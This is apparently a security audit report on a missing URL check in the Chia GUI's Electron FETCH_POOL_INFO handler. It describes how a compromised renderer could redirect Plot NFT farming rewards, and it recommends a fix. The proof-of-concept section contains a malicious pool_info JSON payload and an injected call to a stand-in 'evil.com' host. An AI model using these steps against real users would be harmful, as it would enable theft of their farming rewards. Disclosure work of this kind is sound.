### Title
Missing Input Validation in `FETCH_POOL_INFO` IPC Handler Enables Farming Reward Payout Hijack via Compromised Renderer — (File: `packages/gui/src/electron/main.tsx`)

---

### Summary

The Electron main process `FETCH_POOL_INFO` IPC handler accepts a `poolUrl` string from the renderer without independent validation, then constructs and fetches `${poolUrl}/pool_info`. A compromised renderer (e.g., via XSS exploiting NFT metadata or WalletConnect dapp metadata rendered in the React UI) can supply an attacker-controlled HTTPS URL, receive a malicious `targetPuzzleHash` in the response, and inject it into a pool-join transaction — permanently redirecting the victim's farming rewards to the attacker's puzzle hash.

---

### Finding Description

In `packages/gui/src/electron/main.tsx`, the `FETCH_POOL_INFO` IPC handler is:

```js
ipcMainHandle(AppAPI.FETCH_POOL_INFO, async (poolUrl: string) => {
  const poolInfoUrl = `${poolUrl}/pool_info`;
  return fetchJSON(poolInfoUrl);
});
``` [1](#0-0) 

The handler performs **no independent validation of `poolUrl`** before constructing the fetch target. The only gate is inside `fetchJSON`, which validates the *final* constructed URL for `https`/`ipfs` protocol: [2](#0-1) 

Compare this to the `FETCH_TEXT_RESPONSE` handler in the same file, which explicitly validates the URL *before* use: [3](#0-2) 

The renderer-side guard lives in `usePoolInfo.ts`, which validates the URL before calling `getPoolInfo`: [4](#0-3) 

However, a compromised renderer can bypass this entirely and call `window.appAPI.fetchPoolInfo("https://evil.com")` directly via the preload bridge, since the main process does not re-validate.

The `targetPuzzleHash` returned from the pool info endpoint is consumed without further validation in `PlotNFTSelectPool.tsx`: [5](#0-4) 

This value is placed directly into `initialTargetState.targetPuzzleHash` and submitted as the pool join transaction's payout destination.

---

### Impact Explanation

If the renderer is compromised (e.g., via XSS in NFT metadata fields or WalletConnect dapp metadata rendered in React), an attacker can:

1. Call `window.appAPI.fetchPoolInfo("https://attacker.com")` directly, bypassing renderer-side URL validation.
2. The main process fetches `https://attacker.com/pool_info` and returns attacker-controlled JSON containing a malicious `target_puzzle_hash`.
3. The renderer uses this `targetPuzzleHash` in a pool-join transaction.
4. The user confirms the transaction — the confirmation UI shows the pool name and description from the attacker's server (which can be made to look legitimate), while the `targetPuzzleHash` is displayed but is opaque to most users.
5. All future farming rewards from the user's Plot NFT are permanently redirected to the attacker's address.

This is a **payout change affecting pooled farming rewards**, which falls within the Critical/High allowed impact scope.

---

### Likelihood Explanation

Likelihood is **Low-to-Medium**:

- Requires a renderer compromise (XSS). The Electron renderer loads local React content, limiting the XSS surface. However, NFT metadata fields (`name`, `description`, `attributes`) are fetched from attacker-controlled external servers and rendered in React components. React escapes by default, but any future `dangerouslySetInnerHTML` usage or third-party component vulnerability would open this path.
- WalletConnect dapp metadata (`name`, `url`, `description`) is also rendered in the confirmation dialog and could be a future XSS vector.
- The user must confirm the pool join transaction, but the `targetPuzzleHash` shown in `PoolInfo.tsx` is opaque to most users. [6](#0-5) 

---

### Recommendation

Add independent URL validation in the `FETCH_POOL_INFO` IPC handler in the main process, mirroring the pattern used in `FETCH_TEXT_RESPONSE`:

```js
ipcMainHandle(AppAPI.FETCH_POOL_INFO, async (poolUrl: string) => {
  if (!isValidURL(poolUrl)) {
    throw new Error('Invalid pool URL');
  }
  const poolInfoUrl = `${poolUrl}/pool_info`;
  return fetchJSON(poolInfoUrl);
});
```

Additionally, consider validating that the `targetPuzzleHash` returned from the pool info endpoint matches the expected format (64-character hex string) before using it in a transaction.

---

### Proof of Concept

1. Attacker hosts `https://evil.com/pool_info` returning:
   ```json
   {
     "name": "Legitimate Pool",
     "description": "Best pool ever",
     "target_puzzle_hash": "0x<attacker_puzzle_hash>",
     "relative_lock_height": 32,
     "fee": "0.01"
   }
   ```
2. Attacker finds an XSS vector in the Chia GUI renderer (e.g., via a crafted NFT whose metadata field triggers a future rendering vulnerability).
3. Injected script calls: `window.appAPI.fetchPoolInfo("https://evil.com")`.
4. Main process fetches `https://evil.com/pool_info` — passes `fetchJSON`'s `isValidURL` check — and returns the attacker's JSON.
5. The renderer populates `initialTargetState.targetPuzzleHash` with the attacker's puzzle hash and submits the pool join transaction.
6. User sees "Legitimate Pool" in the confirmation UI and approves.
7. All farming rewards from the user's Plot NFT are permanently sent to the attacker's address. [1](#0-0) [7](#0-6) [8](#0-7)
